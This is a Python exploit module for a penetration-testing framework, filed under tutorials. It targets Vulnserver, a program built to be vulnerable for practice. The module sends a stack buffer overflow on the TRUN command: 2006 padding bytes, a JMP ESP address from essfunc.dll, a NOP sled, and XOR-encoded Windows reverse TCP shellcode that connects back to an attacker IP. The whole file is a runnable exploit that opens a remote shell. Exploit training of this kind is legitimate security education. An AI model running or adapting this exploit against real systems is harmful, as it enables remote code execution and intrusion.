#!/usr/bin/env python

#IMPORTS SECTION
from collections import OrderedDict  # for rigth options order
from Sploit import Sploit  # base class for module
import socket
from shellcodes.Shellcodes import OSShellcodes
from shellcodes.ShellUtils import Constants
#INFO SECTION
INFO = {}
INFO['NAME'] = 'vulnserver_buffer_overflow'  # Module name
INFO['DESCRIPTION'] = 'Vulnserver Stack-Based Buffer Overflow'  # Short description of vulnerability
INFO['VENDOR'] = 'http://www.thegreycorner.com/2010/12/introducing-vulnserver.html'  # Vulnerable soft vendor's homepage
INFO['CVE Name'] = ''  # CVE if exists(like 2017-9999)
INFO['NOTES'] = """ """  # Full description of vulnerability
INFO['DOWNLOAD_LINK'] = 'http://sites.google.com/site/lupingreycorner/vulnserver.zip'  # Link to vulnerable soft
INFO['LINKS'] = ['http://resources.infosecinstitute.com/stack-based-buffer-overflow-tutorial-part-1-introduction',
                 'http://resources.infosecinstitute.com/stack-based-buffer-overflow-tutorial-part-2-exploiting-the-stack-overflow/',
                 'http://resources.infosecinstitute.com/stack-based-buffer-overflow-tutorial-part-3-%E2%80%94-adding-shellcode']  # Some helpful links(like exploit's page on exploit-db or link to some article)
INFO['CHANGELOG'] = '17 Apr 2017'  # Usually used for exploit writing date
INFO['PATH'] = 'Tutorials/'  # Virtual path of module. It used in module tree in GUI

# OPTIONS SECTION
OPTIONS = OrderedDict()
OPTIONS['HOST'] = '192.168.1.176'
OPTIONS['PORT'] = 9999
OPTIONS['CONNECTBACK_IP'] = '192.168.1.32'


class exploit(Sploit):
    def __init__(self,host="",
                port=0, ssl=False,
                logger=None):
        Sploit.__init__(self, logger=logger)

    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get('HOST', OPTIONS['HOST'])
        self.port = self.args.get('PORT', OPTIONS['PORT'])
        self.connectback_ip = self.args.get('CONNECTBACK_IP', OPTIONS['CONNECTBACK_IP'])
        if self.args['listener']:
            self.listener_port = self.args['listener']['PORT']
        else:
            self.log('[-] Please enable listener')
            self.finish(False)

    def generate_shellcode(self):
        badchars = ['\x00', '\x0a', '\x0d'] # badchars
        sc = OSShellcodes(Constants.OS.WINDOWS,
                          Constants.OS_ARCH.X32,
                          self.connectback_ip,
                          self.listener_port,
                          badchars)
        shell = sc.create_shellcode(
            Constants.ShellcodeConnection.REVERSE,  # tcp connect back shellcode
            encode=Constants.EncoderType.XOR # Encoding to remove badchars
            )
        return shell

    def run(self):
        #Get options from gui
        self.args()
        #YOUR CODE
        sock = socket.socket()
        sock.connect((self.host, self.port))  # connects to vulnserver.exe
        payload = 'TRUN .'
        payload += 'A' * 2006
        payload += '\xAF\x11\x50\x62'  # essfunc.dll JMP ESP(0x625011AF)
        payload += '\x90' * 16 # 16 NOPs
        payload += self.generate_shellcode()
        sock.sendall(payload)
        ##########
        self.finish(True)


if __name__ == '__main__':
    print "Running exploit %s .. " % INFO['NAME']
    e = exploit("192.168.0.1", 80)
    e.run()
